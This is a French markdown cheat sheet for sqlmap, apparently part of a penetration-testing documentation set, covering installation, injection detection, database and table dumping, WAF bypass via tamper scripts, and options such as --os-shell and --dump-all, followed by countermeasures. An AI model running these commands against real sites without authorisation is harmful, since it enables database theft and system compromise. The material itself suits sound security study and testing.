## 5. `docs/Couche5_7_Application/cheat-couche5-7.md`

```markdown
# Couche 5-7 (Application) – Sqlmap
**Version Testée : Sqlmap 1.6.x**  
**Attaque Ciblée : Injection SQL**

*Ce document est structuré pour une intégration avec le script automatisé qui génère un rapport complet des commandes exécutées via Sqlmap.*

---

## Sommaire

1. [Introduction](#introduction)
2. [Installation & Pré-requis](#installation--pré-requis)
3. [Commandes Clés](#commandes-clés)
4. [Fonctionnalités Avancées](#fonctionnalités-avancées)
5. [Contre-mesures](#contre-mesures)
6. [Intégration avec le Script](#intégration-avec-le-script)
7. [Références & Ressources](#références--ressources)

---

## Introduction

Sqlmap est un outil d’automatisation pour la détection et l’exploitation de vulnérabilités SQL. Il supporte plusieurs SGBD et propose des techniques avancées pour contourner les protections (WAF, etc.).

---

## Installation & Pré-requis

1. **Python requis.**  
2. **Cloner le dépôt :**
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
3.	Exécution :
Utilisez python sqlmap.py ou le binaire sqlmap selon votre installation.
________________________________________
Commandes Clés
1. Détection d’une injection SQL
sqlmap -u "http://site.com/page?id=1" --batch
Détail :
--batch permet d’automatiser les réponses par défaut.
2. Extraire les bases de données
sqlmap -u "http://site.com/page?id=1" --dbs
3. Extraire une table spécifique
sqlmap -u "http://site.com/page?id=1" -D nom_de_base -T nom_de_table --dump
4. Bypass WAF
sqlmap -u "http://site.com/page?id=1" --tamper=space2comment
Détail :
Utilisation d’un script de modification pour contourner un WAF.
________________________________________
Fonctionnalités Avancées
•	--os-shell : Ouvre un shell système (si supporté par la base).
•	--sql-shell : Accès interactif à la base de données.
•	--dump-all : Extraction complète de la base.
•	--technique= : Spécifier les techniques d’injection à tester (UNION, BOOLEAN, etc.).
________________________________________
Contre-mesures
•	Développement sécurisé : 
o	Valider et filtrer les entrées utilisateur.
o	Utiliser des requêtes préparées (ex. PDO).
•	Défense en profondeur : 
o	Déployer un WAF.
o	Appliquer le principe du moindre privilège sur les comptes de base.
________________________________________
Intégration avec le Script
•	Annotations :
Le script enregistrera l’exécution de chaque commande Sqlmap ainsi que les résultats pour générer un rapport final détaillé.
•	Log des actions :
Chaque interaction (commande, option, résultat) sera capturée pour une analyse post-exécution.
________________________________________
Références & Ressources
•	Site Officiel SQLmap
•	GitHub SQLmap
•	OWASP Injection

---
